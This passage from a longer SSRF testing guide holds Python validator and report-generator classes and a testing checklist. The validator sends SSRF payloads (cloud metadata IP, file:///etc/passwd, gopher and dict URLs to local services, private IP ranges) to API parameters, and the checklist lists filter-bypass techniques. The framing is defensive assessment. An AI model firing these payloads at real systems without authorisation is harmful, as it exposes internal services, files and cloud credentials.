print(f"Critical vulnerabilities: {report['scan_summary']['critical_count']}")
```

## 4.0 SSRF Protection & Mitigation

### 4.1 Protection Mechanisms Implementation

```python
# SSRF Protection Validator
class SSRFProtectionValidator:
    def __init__(self, base_url):
        self.base_url = base_url
        self.protection_issues = []
        self.session = requests.Session()
    
    def validate_url_filtering(self, endpoints):
        """Validate URL filtering implementation"""
        print("Validating URL filtering...")
        
        test_payloads = [
            'http://localhost',
            'http://127.0.0.1',
            'http://169.254.169.254',
            'file:///etc/passwd',
            'gopher://127.0.0.1:22'
        ]
        
        for endpoint_info in endpoints:
            endpoint = endpoint_info['endpoint']
            method = endpoint_info.get('method', 'GET')
            param_name = endpoint_info['param_name']
            
            for payload in test_payloads:
                try:
                    if method == 'GET':
                        params = {param_name: payload}
                        response = self.session.get(
                            f"{self.base_url}{endpoint}", 
                            params=params,
                            timeout=10
                        )
                    elif method == 'POST':
                        data = {param_name: payload}
                        response = self.session.post(
                            f"{self.base_url}{endpoint}", 
                            json=data,
                            timeout=10
                        )
                    
                    # Check if request was blocked or filtered
                    if response.status_code == 200:
                        self.protection_issues.append({
                            'type': 'Missing URL Filtering',
                            'endpoint': endpoint,
                            'method': method,
                            'parameter': param_name,
                            'payload': payload,
                            'severity': 'High',
                            'description': f'Dangerous URL was not filtered: {payload}'
                        })
                    elif response.status_code == 403:
                        # Good - request was blocked
                        pass
                        
                except Exception as e:
                    continue
    
    def validate_dns_resolution(self, endpoints):
        """Validate DNS resolution restrictions"""
        print("Validating DNS resolution...")
        
        internal_domains = [
            'localhost',
            'internal.service',
            'database.local',
            'redis.internal'
        ]
        
        for endpoint_info in endpoints:
            endpoint = endpoint_info['endpoint']
            method = endpoint_info.get('method', 'GET')
            param_name = endpoint_info['param_name']
            
            for domain in internal_domains:
                payload = f'http://{domain}/'
                
                try:
                    if method == 'GET':
                        params = {param_name: payload}
                        response = self.session.get(
                            f"{self.base_url}{endpoint}", 
                            params=params,
                            timeout=10
                        )
                    elif method == 'POST':
                        data = {param_name: payload}
                        response = self.session.post(
                            f"{self.base_url}{endpoint}", 
                            json=data,
                            timeout=10
                        )
                    
                    if response.status_code == 200:
                        self.protection_issues.append({
                            'type': 'Missing DNS Filtering',
                            'endpoint': endpoint,
                            'method': method,
                            'parameter': param_name,
                            'payload': payload,
                            'severity': 'High',
                            'description': f'Internal domain was resolved: {domain}'
                        })
                        
                except Exception as e:
                    continue
    
    def validate_protocol_restrictions(self, endpoints):
        """Validate protocol handler restrictions"""
        print("Validating protocol restrictions...")
        
        dangerous_protocols = [
            'file:///etc/passwd',
            'gopher://127.0.0.1:22',
            'dict://localhost:6379',
            'sftp://example.com:22'
        ]
        
        for endpoint_info in endpoints:
            endpoint = endpoint_info['endpoint']
            method = endpoint_info.get('method', 'GET')
            param_name = endpoint_info['param_name']
            
            for protocol_url in dangerous_protocols:
                try:
                    if method == 'GET':
                        params = {param_name: protocol_url}
                        response = self.session.get(
                            f"{self.base_url}{endpoint}", 
                            params=params,
                            timeout=10
                        )
                    elif method == 'POST':
                        data = {param_name: protocol_url}
                        response = self.session.post(
                            f"{self.base_url}{endpoint}", 
                            json=data,
                            timeout=10
                        )
                    
                    if response.status_code == 200:
                        self.protection_issues.append({
                            'type': 'Missing Protocol Restrictions',
                            'endpoint': endpoint,
                            'method': method,
                            'parameter': param_name,
                            'payload': protocol_url,
                            'severity': 'High',
                            'description': f'Dangerous protocol was allowed: {protocol_url}'
                        })
                        
                except Exception as e:
                    continue
    
    def validate_network_segmentation(self, endpoints):
        """Validate network segmentation for outbound requests"""
        print("Validating network segmentation...")
        
        internal_ips = [
            'http://192.168.1.1/',
            'http://10.0.0.1/',
            'http://172.16.0.1/'
        ]
        
        for endpoint_info in endpoints:
            endpoint = endpoint_info['endpoint']
            method = endpoint_info.get('method', 'GET')
            param_name = endpoint_info['param_name']
            
            for internal_ip in internal_ips:
                try:
                    if method == 'GET':
                        params = {param_name: internal_ip}
                        response = self.session.get(
                            f"{self.base_url}{endpoint}", 
                            params=params,
                            timeout=10
                        )
                    elif method == 'POST':
                        data = {param_name: internal_ip}
                        response = self.session.post(
                            f"{self.base_url}{endpoint}", 
                            json=data,
                            timeout=10
                        )
                    
                    if response.status_code == 200:
                        self.protection_issues.append({
                            'type': 'Missing Network Segmentation',
                            'endpoint': endpoint,
                            'method': method,
                            'parameter': param_name,
                            'payload': internal_ip,
                            'severity': 'High',
                            'description': f'Access to internal network was allowed: {internal_ip}'
                        })
                        
                except Exception as e:
                    continue
    
    def generate_protection_report(self):
        """Generate protection implementation report"""
        protection_levels = {
            'excellent': 0,
            'good': 0,
            'fair': 0,
            'poor': 0
        }
        
        if not self.protection_issues:
            protection_levels['excellent'] = 100
        else:
            high_severity = len([issue for issue in self.protection_issues if issue['severity'] == 'High'])
            medium_severity = len([issue for issue in self.protection_issues if issue['severity'] == 'Medium'])
            
            if high_severity == 0 and medium_severity == 0:
                protection_levels['good'] = 100
            elif high_severity == 0:
                protection_levels['fair'] = 100
            else:
                protection_levels['poor'] = 100
        
        return {
            'protection_issues': self.protection_issues,
            'protection_level': protection_levels,
            'recommendations': self.generate_protection_recommendations()
        }
    
    def generate_protection_recommendations(self):
        """Generate protection implementation recommendations"""
        recommendations = []
        
        issue_types = [issue['type'] for issue in self.protection_issues]
        
        if 'Missing URL Filtering' in issue_types:
            recommendations.append("Implement strict URL validation and block dangerous URLs")
        
        if 'Missing DNS Filtering' in issue_types:
            recommendations.append("Implement DNS resolution filtering for internal domains")
        
        if 'Missing Protocol Restrictions' in issue_types:
            recommendations.append("Disable dangerous protocol handlers")
        
        if 'Missing Network Segmentation' in issue_types:
            recommendations.append("Implement network segmentation and firewall rules")
        
        if not recommendations:
            recommendations.append("Maintain current protection measures and conduct regular testing")
        
        return recommendations

# Protection Validation Example
validator = SSRFProtectionValidator('https://api.example.com')

validation_endpoints = [
    {
        'endpoint': '/api/fetch',
        'method': 'GET',
        'param_name': 'url'
    },
    {
        'endpoint': '/api/download',
        'method': 'POST',
        'param_name': 'file_url'
    }
]

validator.validate_url_filtering(validation_endpoints)
validator.validate_dns_resolution(validation_endpoints)
validator.validate_protocol_restrictions(validation_endpoints)
validator.validate_network_segmentation(validation_endpoints)

protection_report = validator.generate_protection_report()
print(f"Protection Level: {protection_report['protection_level']}")
```

## 5.0 SSRF Testing Checklist & Report

### 5.1 Comprehensive Testing Checklist

```markdown
# API Server-Side Request Forgery Testing Checklist

## 🌐 Basic SSRF Testing
- [ ] URL parameter manipulation testing
- [ ] Localhost access attempts (127.0.0.1, localhost)
- [ ] Internal IP range scanning
- [ ] File protocol handler testing
- [ ] Response analysis for internal data

## 🔌 Protocol Handler Testing
- [ ] file:// protocol for local file access
- [ ] gopher:// for internal service interaction
- [ ] dict:// for port scanning and service discovery
- [ ] sftp:// for internal file system access
- [ ] ldap:// for directory service attacks

## ☁️ Cloud Metadata Testing
- [ ] AWS metadata service (169.254.169.254)
- [ ] Google Cloud metadata (metadata.google.internal)
- [ ] Azure metadata service (169.254.169.254)
- [ ] DigitalOcean metadata (169.254.169.254)
- [ ] Kubernetes API server access

## 🏠 Internal Service Testing
- [ ] Common service port scanning (22, 80, 443, 3306, 5432, 6379, 27017)
- [ ] Database service access attempts
- [ ] Cache server interaction testing
- [ ] Internal web application access
- [ ] Management interface discovery

## 🕶️ Blind SSRF Testing
- [ ] Out-of-band callback server testing
- [ ] DNS lookup timing analysis
- [ ] HTTP request timing analysis
- [ ] Error-based blind detection
- [ ] Time-delay based detection

## 🔄 Filter Bypass Testing
- [ ] URL encoding and double encoding
- [ ] IPv6 address representation
- [ ] Decimal IP address notation
- [ ] Hexadecimal IP address notation
- [ ] DNS rebinding techniques
- [ ] Mixed case and special characters
- [ ] URL parser confusion

## 🛡️ Protection Mechanism Validation
- [ ] URL validation and filtering effectiveness
- [ ] DNS resolution restrictions
- [ ] Protocol handler disabling
- [ ] Network segmentation testing
- [ ] Outbound firewall rule validation
```

### 5.2 Executive Security Report Template

```python
# SSRF Security Report Generator
class SSRFReportGenerator:
    def __init__(self, scan_results, company_info):
        self.scan_results = scan_results
        self.company_info = company_info
        self.report = {}
    
    def generate_executive_summary(self):
        """Generate executive summary"""
        critical_count = len(self.scan_results.get('critical', []))
        high_count = len(self.scan_results.get('high', []))
        
        overall_risk = "Low"
        if critical_count > 0:
            overall_risk = "Critical"
        elif high_count > 2:
            overall_risk = "High"
        elif high_count > 0:
            overall_risk = "Medium"
        
        return {
            'company_name': self.company_info.get('name'),
            'assessment_date': self.company_info.get('date'),
            'overall_risk_level': overall_risk,
            'critical_vulnerabilities': critical_count,
            'high_vulnerabilities': high_count,
            'total_vulnerabilities': sum(len(vulns) for vulns in self.scan_results.values()),
            'key_findings': self.get_key_findings()
        }
    
    def get_key_findings(self):
        """Extract key findings from scan results"""
        key_findings = []
        
        # Prioritize critical and high severity issues
        for severity in ['critical', 'high']:
            for vuln in self.scan_results.get(severity, []):
                key_findings.append({
                    'title': vuln.get('type', 'Unknown'),
                    'severity': severity,
                    'description': vuln.get('description', ''),
                    'impact': self.assess_business_impact(vuln),
                    'endpoint': vuln.get('endpoint', 'N/A')
                })
        
        return key_findings[:5]  # Top 5 findings
    
    def assess_business_impact(self, vulnerability):
        """Assess business impact of vulnerability"""
        impact_mapping = {
            'Cloud Metadata SSRF': 'Cloud infrastructure compromise',
            'Redis SSRF': 'Cache database compromise',
            'MySQL SSRF': 'Database server compromise',
            'Internal Service SSRF': 'Internal network breach',
            'File Protocol SSRF': 'Server file system access'
        }
        
        return impact_mapping.get(vulnerability.get('type'), 'Internal network access')
    
    def generate_technical_details(self):
        """Generate technical details section"""
        technical_details = {}
        
        for severity, vulnerabilities in self.scan_results.items():
            technical_details[severity] = []
            for vuln in vulnerabilities:
                technical_details[severity].append({
                    'type': vuln.get('type'),
                    'description': vuln.get('description'),
                    'endpoint': vuln.get('endpoint', 'N/A'),
                    'method': vuln.get('method', 'N/A'),
                    'parameter': vuln.get('parameter', 'N/A'),
                    'payload': vuln.get('payload', 'N/A'),
                    'evidence': vuln.get('evidence', ''),
                    'remediation': self.get_remediation(vuln.get('type'))
                })
        
        return technical_details
    
    def get_remediation(self, vulnerability_type):
        """Get remediation guidance for vulnerability type"""
        remediation_guide = {
            'Cloud Metadata SSRF': 'Block access to cloud metadata IP addresses and implement network segmentation',
            'Internal Service SSRF': 'Implement strict URL validation and block internal IP ranges',
            'File Protocol SSRF': 'Disable file protocol handler and implement URL allowlisting',
            'Redis SSRF': 'Block access to Redis ports and implement service authentication',
            'SSRF Filter Bypass': 'Implement multiple layers of validation and use security libraries'
        }
        
        return remediation_guide.get(vulnerability_type, 'Implement comprehensive SSRF protection measures')
    
    def generate_comprehensive_report(self):
        """Generate comprehensive security report"""
        self.report = {
            'executive_summary': self.generate_executive_summary(),
            'technical_details': self.generate_technical_details(),
            'risk_assessment': self.generate_risk_assessment(),
            'recommendations': self.generate_recommendations(),
            'appendix': self.generate_appendix()
        }
        
        return self.report
    
    def generate_risk_assessment(self):
        """Generate risk assessment matrix"""
        risk_matrix = {
            'critical': {
                'count': len(self.scan_results.get('critical', [])),
                'business_impact': 'Critical - Infrastructure Compromise',
                'likelihood': 'High',
                'recommended_timeline': 'Immediate'
            },
            'high': {
                'count': len(self.scan_results.get('high', [])),
                'business_impact': 'High - Data Breach',
                'likelihood': 'Medium-High',
                'recommended_timeline': '1-2 weeks'
            },
            'medium': {
                'count': len(self.scan_results.get('medium', [])),
                'business_impact': 'Medium - Information Disclosure',
                'likelihood': 'Medium',
                'recommended_timeline': '1 month'
            },
            'low': {
                'count': len(self.scan_results.get('low', [])),
                'business_impact': 'Low - Limited Impact',
                'likelihood': 'Low',
                'recommended_timeline': '3 months'
            }
        }
        
        return risk_matrix
    
    def generate_recommendations(self):
        """Generate actionable recommendations"""
        recommendations = {
            'immediate_actions': [],
            'short_term_actions': [],
            'long_term_improvements': []
        }
        
        # Categorize recommendations based on severity
        for severity, vulnerabilities in self.scan_results.items():
            for vuln in vulnerabilities:
                recommendation = {
                    'vulnerability': vuln.get('type'),
                    'action': self.get_remediation(vuln.get('type')),
                    'priority': severity.upper()
                }
                
                if severity in ['critical', 'high']:
                    recommendations['immediate_actions'].append(recommendation)
                elif severity == 'medium':
                    recommendations['short_term_actions'].append(recommendation)
                else:
                    recommendations['long_term_improvements'].append(recommendation)
        
        return recommendations
    
    def generate_appendix(self):
        """Generate report appendix"""
        return {
            'testing_methodology': 'Comprehensive API Server-Side Request Forgery assessment',
            'tools_used': ['Custom Python testing framework', 'Protocol handler testing tools'],
            'scope': self.company_info.get('scope', 'All API endpoints with URL fetching capabilities'),
            'testing_approach': 'Protocol handler testing, internal service access, cloud metadata, blind SSRF',
            'contact_information': self.company_info.get('contact', 'Security Team')
        }

# Report Generation Example
company_info = {
    'name': 'Example API Service',
    'date': '2024-01-15',
    'scope': 'All API endpoints with URL parameters',
    'contact': 'security@example.com'
}

# Assuming scan_results from previous scanning
report_generator = SSRFReportGenerator(scanner.results, company_info)
comprehensive_report = report_generator.generate_comprehensive_report()

# Print report summary
exec_summary = comprehensive_report['executive_summary']
print(f"SSRF Assessment for: {exec_summary['company_name']}")
print(f"Overall Risk: {exec_summary['overall_risk_level']}")
print(f"Critical Issues: {exec_summary['critical_vulnerabilities']}")
print(f"High Issues: {exec_summary['high_vulnerabilities']}")
```

This comprehensive API Server-Side Request Forgery testing framework provides security professionals with advanced tools and methodologies to identify, exploit, and report SSRF vulnerabilities in modern API implementations. The framework covers basic SSRF, protocol handlers, cloud metadata, internal service access, blind SSRF, and provides actionable remediation guidance for protecting APIs against SSRF attacks.